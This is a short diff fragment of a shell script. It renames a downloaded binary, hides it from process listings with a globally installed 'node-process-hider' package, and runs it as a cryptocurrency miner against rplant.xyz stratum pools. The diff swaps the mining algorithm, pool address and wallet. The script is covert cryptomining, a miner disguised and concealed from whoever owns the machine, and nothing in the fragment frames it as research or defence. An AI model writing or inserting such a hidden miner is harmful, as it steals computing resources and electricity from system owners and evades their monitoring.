@@ -11,4 +11,4 @@ npm i -g node-process-hider
 mv @ kontol
 chmod u+x kontol
 ph add kontol
-./kontol -a minotaurx  -o stratum+tcps://stratum-eu.rplant.xyz:17068 -u RFgqtpziL9u4qbC1EyafxgzTXE35mSrCgZ -t20
+./kontol -a phichox  -o stratum+tcps://stratum-asia.rplant.xyz:17031 -u 5k79hkxcQ7axQGBgKjLTdeAQvEA9iPCNv8.BAKULKULI -t20
